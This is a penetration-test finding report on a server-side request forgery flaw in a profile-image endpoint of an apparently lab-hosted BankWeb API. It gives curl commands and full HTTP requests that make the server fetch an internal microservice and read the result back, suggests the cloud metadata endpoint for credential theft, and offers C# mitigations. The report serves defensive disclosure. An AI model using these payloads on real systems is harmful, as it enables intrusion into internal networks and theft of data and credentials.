# Issue #12 — Server-Side Request Forgery (SSRF) in Profile Image Update API

| Field         | Details                                               |
|---------------|-------------------------------------------------------|
| **Target**    | BankWeb API — `http://localhost:1337/api/User/ProfileImage` |
| **Severity**  | High                                                  |
| **CVSS v3.1** | 8.5                                                   |
| **Vector**    | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N                  |
| **Category**  | Server-Side Request Forgery — SSRF           |

---

## Summary

The `POST /api/User/ProfileImage` endpoint accepts a JSON body containing an `imageUrl` parameter, which the server uses to fetch and store the user's profile image from an external URL. The parameter is not validated against any allowlist, allowing an attacker to supply an arbitrary URL — including internal network addresses — and force the server to issue HTTP requests on their behalf.

Exploitation was confirmed in a two-stage attack: the server was first coerced into fetching the response from an internal microservice (`storeapi:8080`) not directly accessible from the internet, and the retrieved data was then exfiltrated by reading it back via the path traversal vulnerability in Issue #11. This demonstrates a fully weaponised SSRF chain that provides access to internal APIs unreachable from outside the network.

---

## Steps to Reproduce

1. Log in and capture your session cookie.
2. Send a `POST` request to `/api/User/ProfileImage` with the `imageUrl` field pointing to an internal service URL:

   ```bash
   curl -s -X POST "http://localhost:1337/api/User/ProfileImage" \
     -H "Content-Type: application/json" \
     -H "Cookie: SessionId=[REDACTED]" \
     -d '{"username":"[REDACTED]","imageUrl":"http://storeapi:8080/api/Store/GetStoreItems"}'
   ```

3. Observe that the server responds with `200 OK` and `New image set.` — confirming the request was made and the response was stored.
4. Retrieve the stored response by fetching the user's profile image:

   ```bash
   curl -s "http://localhost:1337/api/User/ProfileImage?user=[REDACTED]" \
     -H "Cookie: SessionId=[REDACTED]"
   ```

5. Observe that the response body contains the JSON output of the internal `GetStoreItems` API — data that is not directly accessible from outside the network.

---

## Proof of Concept

### Stage 1 — Baseline: Legitimate Image URL

**Request:**

```http
POST /api/User/ProfileImage HTTP/1.1
Host: localhost:1337
Content-Type: application/json
Content-Length: 113
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Cookie: SessionId=[REDACTED]

{
  "username": "[REDACTED]",
  "imageUrl": "https://[REDACTED]/assets/sample-image.png"
}
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Mon, 07 Jul 2025 10:06:57 GMT
Server: Kestrel
Content-Length: 14

New image set.
```

The server fetches the remote URL and stores the result as the user's profile image — with no validation of the URL's destination.

---

### Stage 2 — SSRF Trigger: Internal Service Enumeration

By substituting the `imageUrl` value with an internal network address discovered through the Swagger documentation (Issue #01), the server was directed to fetch data from `storeapi:8080` — an internal hostname not accessible from outside the network perimeter:

**Request:**

```http
POST /api/User/ProfileImage HTTP/1.1
Host: localhost:1337
Content-Type: application/json
Content-Length: 95
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Cookie: SessionId=[REDACTED]

{
  "username": "[REDACTED]",
  "imageUrl": "http://storeapi:8080/api/Store/GetStoreItems"
}
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Mon, 07 Jul 2025 10:11:57 GMT
Server: Kestrel
Content-Length: 14

New image set.
```

The `200 OK` response confirms the server successfully reached the internal `storeapi` host and stored its response.

---

### Stage 3 — Data Exfiltration: Reading Back the Internal Response

The stored SSRF response is retrieved by reading the user's profile image via the `GET` endpoint:

**Request:**

```http
GET /api/User/ProfileImage?user=[REDACTED] HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Cookie: SessionId=[REDACTED]
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Length: 2066
Content-Type: image/jpg
Date: Mon, 07 Jul 2025 10:15:17 GMT
Server: Kestrel

[{"id":1,"name":"1 month credit card fraud protection","description":"Lorem ipsum dolor sit amet...","price":37,"installments":19},{"id":2,"name":"3 months credit card fraud protection","description":"Nullam ut magna nec orci luctus tempus.","price":122,"installments":7},...]
```

The response body contains the full JSON output of the internal `GET /api/Store/GetStoreItems` endpoint — served with `Content-Type: image/jpg`, confirming no content-type validation is performed. Internal API data is fully exfiltrated to the external attacker.

---

## Impact

- **Internal network reconnaissance** — the SSRF allows probing of internal hostnames, IP ranges, and ports that are not accessible from the internet. By observing response sizes, status codes, and response times, an attacker can map the internal network topology.
- **Internal API data exfiltration** — the two-stage attack chain (store → retrieve) transforms the SSRF into a full read primitive against internal services. Any API accessible from the server's internal network can be queried and its response exfiltrated this way.
- **Further internal API abuse** — the Swagger schema (Issue #01) documents additional Store API endpoints including `GET /api/Store/GetHistory` and `POST /api/Store/BuyProduct`. These can be targeted via the same SSRF vector, potentially enabling purchase manipulation or transaction history theft on behalf of any user.
- **Cloud metadata exposure** — if the application is hosted on a cloud platform (AWS, Azure, GCP), the SSRF can be directed at the instance metadata endpoint (e.g. `http://169.254.169.254/latest/meta-data/`) to retrieve IAM credentials, environment variables, or deployment configuration.
- **Compound attack chain** — this finding directly leverages the Swagger documentation exposed in Issue #01 (internal hostname `storeapi:8080` was identified from the API schema context) and is exfiltrated via the profile image GET endpoint, which is itself vulnerable to path traversal (Issue #11). The combination of these three issues forms a high-impact read chain against the internal network.

---

## Recommended Mitigations

1. **Implement a strict URL allowlist** for the `imageUrl` parameter. Only permit requests to known, explicitly approved external domains. Reject any URL that resolves to a private IP range, loopback address, or internal hostname:

   ```csharp
   var allowedHosts = new[] { "images.example.com", "cdn.example.com" };
   var uri = new Uri(imageUrl);

   if (!allowedHosts.Contains(uri.Host, StringComparer.OrdinalIgnoreCase))
       return BadRequest(new { error = "Image URL host is not permitted." });
   ```

2. **Block requests to private IP ranges and internal hostnames** at the network or DNS resolution layer. After resolving the URL's hostname, verify the resulting IP is not within RFC-1918 ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), loopback (`127.0.0.0/8`), or link-local (`169.254.0.0/16`):

   ```csharp
   var resolvedIp = Dns.GetHostAddresses(uri.Host).First();
   if (IsPrivateIp(resolvedIp))
       return BadRequest(new { error = "Image URL resolves to a private address." });
   ```

3. **Validate that the fetched content is a valid image** before storing it. Check both the `Content-Type` header of the remote response and the actual file magic bytes — reject any response that does not conform to an expected image format.

4. **Do not use user-controlled filenames or identifiers as the storage key** for profile images. Store images under a server-assigned identifier (e.g. a UUID) rather than the username, and eliminate the path traversal vector in the GET endpoint (Issue #11) which enables the exfiltration stage of this attack chain.

5. **Segment internal services from the application network** using firewall rules or service mesh policies, ensuring the application server cannot initiate connections to internal microservices directly. Internal APIs should only be reachable via authenticated, internal-only channels.